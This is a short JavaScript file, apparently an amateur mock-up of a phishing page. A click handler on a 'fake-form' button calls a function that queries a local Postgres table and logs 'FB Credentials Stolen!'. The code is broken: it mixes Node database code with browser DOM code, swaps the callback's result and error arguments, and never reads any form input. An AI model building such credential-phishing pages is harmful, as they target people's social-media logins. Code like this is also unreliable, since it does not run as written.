const { Client } = require("pg");

const client = new Client({
  host: "localhost",
  user: "postgres",
  port: 5432,
  password: "???",
  database: "test",
});

function saveCredentials() {
    
  client.connect();

  client.query(
    "SELECT * FROM test1",
    (res, err) => {
      if (!err) {
        console.log('FB Credentials Stolen!');
        console.log(res.rows);
      } else {
        console.log(err.message);
      }
      client.end();
    }
  );
}

let form = document.querySelector('.fake-form');
let button = document.querySelector('.fake-button');
let div = document.createElement('div');
div.innerText = 'poo';
button.addEventListener('click', () => {
    saveCredentials();
})
